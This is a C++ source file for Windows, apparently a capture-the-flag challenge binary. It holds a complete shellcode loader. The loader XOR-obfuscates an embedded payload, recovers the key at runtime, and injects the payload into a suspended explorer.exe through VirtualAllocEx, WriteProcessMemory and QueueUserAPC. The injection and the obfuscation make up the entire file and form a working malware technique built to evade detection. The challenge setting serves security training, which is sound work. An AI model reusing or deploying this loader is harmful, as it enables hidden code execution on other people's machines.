// g++ -o chall main.cpp -std=c++17 -O3 -mwindows -Wl,--strip-all -fno-ident -s

#include <windows.h>
#include <vector>
#include <cstdint>
#include <iostream>
#include <array>
#include "shellcod.h"

HANDLE payload_process = NULL;
constexpr uint32_t PRIME = 2147483647;
constexpr auto encrypt_shellcode() {
    std::array<uint8_t, SHELLCODE_SIZE> result = {};
    for(size_t i = 0; i < SHELLCODE_SIZE; i++) {
        result[i] = shellcode[i] ^ ((PRIME >> (i % 32)) & 0xFF);
    }
    return result;
}

constexpr auto encrypted_shellcode = encrypt_shellcode();

uint32_t find_key() {
    uint8_t target = encrypted_shellcode[0] ^ SHELLCODE_FIRST;
    for(uint32_t i = 0x7FFFFFFF; i > 0; i--) {
        if((i & 0xFF) == target) {
            return i;
        }
    }
    return 0;
}

void decrypt_shellcode(std::vector<uint8_t>& out, uint32_t key) {
    out.resize(SHELLCODE_SIZE);
    for(size_t i = 0; i < SHELLCODE_SIZE; i++) {
        out[i] = encrypted_shellcode[i] ^ ((key >> (i % 32)) & 0xFF);
    }
}

HANDLE inject_apc(const unsigned char* payload, size_t size) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA("C:\\Windows\\explorer.exe",
                        NULL,
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_SUSPENDED,
                        NULL,
                        NULL,
                        &si,
                        &pi)) {
        return NULL;
    }

    LPVOID remote_buffer = VirtualAllocEx(pi.hProcess,
                                          NULL,
                                          size,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_EXECUTE_READWRITE);

    if (!remote_buffer) {
        TerminateProcess(pi.hProcess, 1);
        return NULL;
    }

    if (!WriteProcessMemory(pi.hProcess,
                            remote_buffer,
                            payload,
                            size,
                            NULL)) {
        TerminateProcess(pi.hProcess, 1);
        return NULL;
    }

    if (!QueueUserAPC((PAPCFUNC)remote_buffer,
                      pi.hThread,
                      0)) {
        TerminateProcess(pi.hProcess, 1);
        return NULL;
    }

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    return pi.hProcess;
}

DWORD WINAPI cleanup_thread(LPVOID param) {
    Sleep(5 * 60 * 1000);
    if (payload_process) {
        TerminateProcess(payload_process, 0);
        CloseHandle(payload_process);
    }
    ExitProcess(0);
    return 0;
}

int main() {
    uint32_t key = find_key();
    if(!key) return 1;

    std::vector<uint8_t> decrypted;
    decrypt_shellcode(decrypted, key);

    CreateThread(NULL, 0, cleanup_thread, NULL, 0, NULL);

    payload_process = inject_apc(decrypted.data(), decrypted.size());
    if (!payload_process) {
        return 1;
    }

    WaitForSingleObject(payload_process, INFINITE);
    return 0;
}